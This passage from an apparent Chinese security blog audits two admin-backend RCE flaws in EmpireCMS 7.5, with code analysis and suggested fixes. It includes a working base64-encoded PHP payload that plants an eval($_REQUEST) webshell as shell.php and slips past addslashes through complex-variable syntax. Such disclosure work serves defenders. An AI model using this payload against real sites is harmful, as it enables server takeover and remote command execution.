<p><img src="http://static.zybuluo.com/1160307775/i3ri8ea5z4g4leh18tid1gig/image_1djdnbjo2pelbn91uh11ks21u8p2n.png" alt="image_1djdnbjo2pelbn91uh11ks21u8p2n.png-496.3kB"></p>
<p>$file参数以php结尾，通过<code>WriteFiletext</code>函数向$file中写入上一步的pagetext(这里为$indextext)，而<code>WriteFiletext</code>是没有任何过滤的</p>
<pre><code>function WriteFiletext($filepath,$string){
    global $public_r;
    $string=stripSlashes($string);
    $fp=@fopen($filepath,&quot;w&quot;);
    @fputs($fp,$string);
    @fclose($fp);
    if(empty($public_r[filechmod]))
    {
        @chmod($filepath,0777);
    }
}</code></pre><p>于是在<code>e/data/tmp</code>目录下，以模版文件的形式写入webshell，同时也将AddCheckViewTempCode()返回的权鉴方法写了进去，所以我们不能直接以url的方式访问这个webshell。<br><img src="http://static.zybuluo.com/1160307775/zp17zrn2j1muego2qa7p9din/image_1djdo4l1d1gte63t1qcb1a73aho4e.png" alt="image_1djdo4l1d1gte63t1qcb1a73aho4e.png-278.6kB"></p>
<p>但是仍有方法使这个webshell执行并将结果输出。原因在下面这几行<br><img src="http://static.zybuluo.com/1160307775/ecp2rqbzer4w4xk8lw33ghcz/image_1djdnjf5p1b2p1oan4pqn7bd2434.png" alt="image_1djdnjf5p1b2p1oan4pqn7bd2434.png-564.3kB"></p>
<p>由于入口处定义了常量<code>InEmpireCMS</code>，ob_get_contents可以读取缓冲区的输出，而输出正好是刚才我们包含进去的shell的结果。因此执行了phpinfo()后将要输出到浏览器的内容赋值给了$string变量并返回，在<code>ReUserpage</code>函数中又进行了一次写入，缓冲结果写入的根目录下的shell.php，造成一个表面getshell的现象，其实是一种rce。</p>
<p><img src="http://static.zybuluo.com/1160307775/ceu2e6w6h3a09qkm8krde4sx/image_1djdnpbbj180fdns1d2h1bvd1neu3h.png" alt="image_1djdnpbbj180fdns1d2h1bvd1neu3h.png-355.3kB"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>设置<code>$public_r[candocode]</code>为true进行写入内容的过滤</p>
<h2 id="后台首页模版处rce到getshell"><a href="#后台首页模版处rce到getshell" class="headerlink" title="后台首页模版处rce到getshell"></a>后台首页模版处rce到getshell</h2><p>承接上一个漏洞，整个empirecms不少用到ob_get_contents的地方，所以就想挖掘一下还有没有其他可以利用的点，最后把眼光锁在增加模版处。</p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在后台模版功能处，选择管理首页模版，然后点击增加首页方案<br><img src="http://static.zybuluo.com/1160307775/92bdlk6m16ygken7p4xw18dj/image_1djp1p7ed1g6q1vs61qof19pb7cjm.png" alt="image_1djp1p7ed1g6q1vs61qof19pb7cjm.png-226.2kB"></p>
<p>复制下面的payload，填写到模版内容处，点击提交。</p>
<pre><code>&lt;?php 
$aa = base64_decode(ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA);
${(system)($aa)};
?&gt;</code></pre><p><img src="http://static.zybuluo.com/1160307775/86i5w3sopy8hik249iozojxo/image_1djp1rm8v2kc1s6l1f3b1g59cjk1g.png" alt="image_1djp1rm8v2kc1s6l1f3b1g59cjk1g.png-311.9kB"></p>
<p>其中base64编码部分为</p>
<pre><code>ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA
=&gt;
echo &#39;&lt;?php eval($_REQUEST[hp]);&#39;&gt;shell.php</code></pre><p>再点击<strong>启用此方案</strong>即可getshell，在<code>e/admin/template/</code>目录下生成shell.php</p>
<p><img src="http://static.zybuluo.com/1160307775/jck0izcors9rxr3b8ydk78gf/image_1djp21du0o250ocp31lnuad21t.png" alt="image_1djp21du0o250ocp31lnuad21t.png-64.3kB"><br><img src="http://static.zybuluo.com/1160307775/jeakcfnhj6ljtu09tq4tcsnu/image_1djp23v55qua1pa11b021uir1qmp2a.png" alt="image_1djp23v55qua1pa11b021uir1qmp2a.png-278.2kB"></p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在e/class/functions.php的<code>NewsBq</code>函数中调用<code>WriteFiletext</code>函数向/e/data/tmp/index.php中写入文件并包含<br><img src="http://static.zybuluo.com/1160307775/vngxtn93avtnyhl4ix12mndr/image_1djp2kjth3i01l78dg91q3g1lba2n.png" alt="image_1djp2kjth3i01l78dg91q3g1lba2n.png-588.3kB"></p>
<p>查找一下哪些地方调用<code>NewsBq</code>函数，最后锁定在<code>e/admin/template/ListIndexpage.php</code>的<code>DefIndexpage</code>中<br><img src="http://static.zybuluo.com/1160307775/w6dlwq628kgerrrfr67flxfq/image_1djp2t8jo6ej1l7t1ui9t9i734.png" alt="image_1djp2t8jo6ej1l7t1ui9t9i734.png-459.9kB"></p>
<p>首先从库里获取得到<code>$r[temptext]</code>作为参数传入NewsBq，此时<code>$class</code>为null。那么文件内容可控吗？查看一下入库的语句，看看存不存在任意写入，全局搜索<code>enewsindexpage</code></p>
<p>在同文件ListIndexpage.php的第23行到47行，调用insert语句向<code>enewsindexpage</code>中增加数据，关键代码如下</p>
<pre><code>function AddIndexpage($add,$userid,$username){
    global $empire,$dbtbpre;
    if(!$add[tempname]||!$add[temptext])
    {
        printerror(&quot;EmptyIndexpageName&quot;,&quot;history.go(-1)&quot;);
    }
    ...
    $add[tempname]=hRepPostStr($add[tempname],1);
    $add[temptext]=RepPhpAspJspcode($add[temptext]);
    $sql=$empire-&gt;query(&quot;insert into {$dbtbpre}enewsindexpage(tempname,temptext) values(&#39;&quot;.$add[tempname].&quot;&#39;,&#39;&quot;.eaddslashes2($add[temptext]).&quot;&#39;);&quot;);
    ...
}</code></pre><p>调用AddIndexpage的入口为：</p>
<pre><code>$enews=$_POST[&#39;enews&#39;];
if(empty($enews))
{$enews=$_GET[&#39;enews&#39;];}

if($enews==&quot;AddIndexpage&quot;)
{
    AddIndexpage($_POST,$logininid,$loginin);
}</code></pre><p>所以<code>$add</code>为<code>$_POST</code>获取的数组，经过一次<code>eaddslashes2</code>函数清洗后以temptext字段存入库，而<code>eaddslashes2</code>在内部调用的是addslashes。猜想开发者最初可能只是为了防止sql注入，而没有进行其他类型过滤。但是我们执行任意命令是可以绕过addslashes的限制，取出来temptext字段来rce。</p>
<p>只需要用到复杂变量：<a href="https://www.jianshu.com/p/7c818ddc5731" target="_blank" rel="noopener">PHP复杂变量绕过addslashes()直接拿shell</a></p>
<p>整理思路：入库rce语句-&gt;取出库-&gt;写文件-&gt;包含rce-&gt;getshell</p>
<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>对入库语句进行过滤，建议在<code>eaddslashes2</code>中增加一些过滤机制</p>

                
            </div>
            <div class="continue">
            <a href="/2019/09/09/帝国(EmpireCMS)7.5的两个后台RCE审计/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
</section>

  <nav class="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a>
  </nav>

    </main>
    <a class="not-found">not found!</a>
    <div class="search-items">
    </div>
    <a href="#header" id="top" style="display:none">
        <i class="fa fa-sort-asc fa-2x"></i>
    </a>
    <footer class="footer">
    <div class="footer-copyright">©️2017
    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
    </div>
</footer>

    <script src="/js/jquery.js"></script>
    <script src="/js/toki.js"></script>  
  <script>hljs.initHighlightingOnLoad();</script>
</body>
</html>